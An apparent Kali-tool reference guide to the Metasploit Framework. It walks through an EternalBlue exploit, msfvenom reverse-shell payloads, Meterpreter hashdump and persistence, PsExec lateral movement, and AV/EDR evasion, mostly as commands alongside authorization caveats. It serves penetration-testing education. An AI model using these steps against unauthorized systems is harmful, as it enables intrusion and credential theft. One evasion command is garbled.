---
tool_name: "metasploit-framework"
display_name: "Metasploit Framework"
mitre_tactic: "command_and_control"
mitre_tactic_id: "TA0011"
mitre_subcategory: "c2_frameworks"
install_command: "sudo apt install metasploit-framework"
version: "6.4.135"
github_repo: "https://github.com/rapid7/metasploit-framework"
kali_tools_page: "https://www.kali.org/tools/metasploit-framework/"
difficulty_level: "beginner-to-advanced"
requires_root: true
gui_available: true
tags: ["c2", "exploitation", "meterpreter", "payload", "post-exploitation", "metasploit"]
related_tools: ["msfvenom", "armitage", "meterpreter", "msfconsole"]
---

# Metasploit Framework

## Chapter 1: Introduction & Overview

### What is Metasploit Framework?
Metasploit Framework is the world's most widely used open-source platform for vulnerability research, exploit development, and the creation of custom security tools. It provides a comprehensive environment for developing and executing exploits, managing payloads, performing post-exploitation activities, and maintaining command and control over compromised systems.

### History & Background
- **Created:** 2003 by HD Moore
- **Maintained:** Rapid7 (38.6k stars, 14.9k forks)
- **License:** BSD-style (BSD-3-Clause)
- **Purpose:** Exploit development, vulnerability research, penetration testing, red team operations

Metasploit is the foundation of modern penetration testing. It contains over 2,000 exploits, 500+ auxiliary modules, and 600+ payloads, making it the most comprehensive exploitation framework available.

### When to Use This Tool
- **Penetration testing:** Exploiting vulnerabilities and maintaining access
- **Red team operations:** Full-spectrum adversary emulation
- **Vulnerability research:** Testing and developing exploits
- **Post-exploitation:** Information gathering, privilege escalation, lateral movement
- **Education:** Learning exploitation and post-exploitation concepts

### When NOT to Use This Tool
- Without explicit written authorization from the target organization
- On production systems without proper planning
- For unauthorized access or malicious activity
- When a simpler tool would suffice (Metasploit is heavyweight)

### Legal and Ethical Considerations
- **Always obtain written permission** before using Metasploit against any target
- **Understand your scope** - know exactly what you are authorized to test
- **Document everything** - maintain records of all exploit attempts and access obtained
- **Report vulnerabilities** - follow responsible disclosure practices
- **Clean up** - remove all artifacts after engagement completion

### Key Concepts
- **Exploit:** Code that takes advantage of a vulnerability to gain access
- **Payload:** Code that runs on the target after successful exploitation
- **Meterpreter:** Advanced, stealthy, extensible payload for post-exploitation
- **Auxiliary Module:** Non-exploitation modules for scanning, fuzzing, and information gathering
- **Handler:** Server-side component that receives connections from payloads

---

## Chapter 2: Installation & Setup

### System Requirements
- **Minimum RAM:** 2 GB (4 GB recommended)
- **Disk Space:** 1 GB for full install
- **Database:** PostgreSQL for session and host tracking
- **Privileges:** Root required for most operations

### Installation Methods

#### Method 1: APT (Recommended - Pre-installed on Kali)
```bash
sudo apt update
sudo apt install metasploit-framework
```

#### Method 2: Official Installer
```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### Database Setup
```bash
# Initialize the database
sudo msfdb init

# Start the database
sudo msfdb start

# Verify database status
sudo msfdb status
```

### Starting Metasploit
```bash
# Start msfconsole
msfconsole

# Start with database
sudo msfdb run
```

---

## Chapter 3: Core Concepts

### Architecture Overview
Metasploit uses a modular architecture:
- **Exploits:** Modules that leverage vulnerabilities to gain access
- **Payloads:** Code executed on the target after exploitation
- **Auxiliary Modules:** Scanners, fuzzers, and support tools
- **Post Modules:** Post-exploitation capabilities
- **Encoders:** Tools to obfuscate payloads
- **Nops:** Non-operation instructions for buffer alignment

### The Exploit-Payload Model
```
Exploit (leverages vulnerability) + Payload (code to execute) = Session
```

### Meterpreter Architecture
Meterpreter runs in the target's memory:
- **Core:** Basic system interaction
- **Extensions:** Modular post-exploitation capabilities
- **Stages:** Download additional functionality as needed
- **Channels:** Encrypted communication with the handler

### Session Management
- **Meterpreter Sessions:** Full post-exploitation capabilities
- **Shell Sessions:** Basic command-line access
- **Session Routing:** Route traffic through sessions for pivoting

---

## Chapter 4: Basic Usage

### Starting msfconsole
```bash
msfconsole
```

### Searching for Modules
```bash
# Search for exploits
msf6 > search type:exploit platform:windows smb

# Search for specific vulnerability
msf6 > search ms17_010

# Search for auxiliary modules
msf6 > search type:auxiliary scanner
```

### Using an Exploit
```bash
# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# View options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.100

# Run the exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Generating Payloads with msfvenom
```bash
# Generate a Windows Meterpreter payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe

# Generate shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shellcode.bin

# Generate a PHP payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shell.php
```

### Post-Exploitation with Meterpreter
```bash
# System information
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# File operations
meterpreter > download C:\Users\target\file.txt
meterpreter > upload /path/to/payload.exe C:\temp\

# Privilege escalation
meterpreter > getsystem
meterpreter > hashdump

# Persistence
meterpreter > run persistence -U -i 5 -p <PORT> -r <IP>
```

---

## Chapter 5: Advanced Usage

### Lateral Movement
```bash
# Use PsExec for lateral movement
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 192.168.1.51
msf6 exploit(windows/smb/psexec) > set SMBUser admin
msf6 exploit(windows/smb/psexec) > set SMBPass password123
msf6 exploit(windows/smb/psexec) > exploit

# Use WMI for lateral movement
msf6 > use auxiliary/admin/wmi/wmi_exec
msf6 auxiliary(admin/wmi/wmi_exec) > set RHOSTS 192.168.1.51
msf6 auxiliary(admin/wmi/wmi_exec) > set COMMAND whoami
msf6 auxiliary(admin/wmi/wmi_exec) > run
```

### Port Forwarding and Pivoting
```bash
# Set up port forwarding through a session
meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.1

# Route traffic through a session
msf6 > route add 10.0.0.0/24 1

# Use SOCKS proxy
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run
```

### Information Gathering
```bash
# Use auxiliary modules for recon
msf6 > use auxiliary/scanner/discovery/udp_sweep
msf6 auxiliary(scanner/discovery/udp_sweep) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/discovery/udp_sweep) > run

# Use db_nmap for database-integrated scanning
msf6 > db_nmap -sV 192.168.1.0/24
msf6 > hosts
msf6 > services
```

### Automation with Resource Files
```bash
# Create a resource file (commands.rc)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.50
set LHOST 192.168.1.100
exploit

# Run the resource file
msf6 > resource commands.rc
```

---

## Chapter 6: Integration & Automation

### REST API
Metasploit provides a REST API for automation:
```bash
# Start the RPC server
msfrpcd -P your_password -S -f

# Use the API
curl -X POST https://127.0.0.1:55553/api/1.0/auth/login -d '{"username":"msf","password":"your_password"}'
```

### Integration with Other Tools
- **Armitage:** GUI front-end for Metasploit
- **BloodHound:** Active Directory enumeration and attack path analysis
- **CrackMapExec:** Network authentication and lateral movement
- **PowerShell Empire:** PowerShell-based post-exploitation

### Automation Workflows
```bash
# Automated exploitation workflow
# 1. Scan targets
db_nmap -sV 192.168.1.0/24

# 2. Search for exploitable services
msf6 > services -p 445 --column name

# 3. Auto-exploit
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS file:/tmp/targets.txt
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
```

---

## Chapter 7: OPSEC & Defense Evasion

### Payload Obfuscation
```bash
# Use encoders to obfuscate payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe

# Use encryption
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> - encrypt aes256 -f exe -o payload.exe
```

### Meterpreter Evasion
- **Memory injection:** Run in legitimate processes
- **Encrypted communication:** Use HTTPS handlers
- **Sleep intervals:** Randomize beacon timing
- **Traffic shaping:** Mimic legitimate network patterns

### Best Practices
1. Always test payloads against AV/EDR before deployment
2. Use encoding and encryption on all payloads
3. Implement sleep jitter to avoid pattern detection
4. Use legitimate-looking domains and certificates
5. Monitor for detection and be prepared to adapt

### Common Detection Methods
- Signature-based AV detection
- Behavioral analysis (process injection, network patterns)
- AMSI (Antimalware Scan Interface) detection
- ETW (Event Tracing for Windows) monitoring

---

## Chapter 8: Troubleshooting & FAQ

### Common Issues

**Problem: Database not connecting**
```bash
# Check PostgreSQL status
sudo systemctl status postgresql

# Reinitialize the database
sudo msfdb reinit

# Verify database connection
msf6 > db_status
```

**Problem: Exploit fails**
- Verify target is vulnerable (use vulnerability scanner)
- Check network connectivity
- Ensure payload is compatible with target architecture
- Look for AV/EDR blocking the exploit

**Problem: Meterpreter session drops**
- Increase session timeout
- Check network stability
- Use a different payload type
- Implement session resurrection

**Problem: msfvenom payload detected**
- Use different encoders
- Apply multiple encoding iterations
- Use custom obfuscation
- Test against target defenses

### Debug Mode
```bash
# Enable verbose logging
setg LogLevel 3

# Check framework version
msf6 > version

# Update framework
sudo apt update && sudo apt install metasploit-framework
```

---

## Resources

- **GitHub Repository:** https://github.com/rapid7/metasploit-framework
- **Kali Tools Page:** https://www.kali.org/tools/metasploit-framework/
- **Metasploit Documentation:** https://docs.metasploit.com/
- **Metasploit Unleashed:** https://www.offsec.com/metasploit-unleashed/
- **MITRE ATT&CK - Command and Control:** https://attack.mitre.org/tactics/TA0011/
- **MITRE ATT&CK - Exploitation for Client Execution:** https://attack.mitre.org/techniques/T1203/
- **Related Tools:** Armitage, msfvenom, Meterpreter, PowerShell Empire
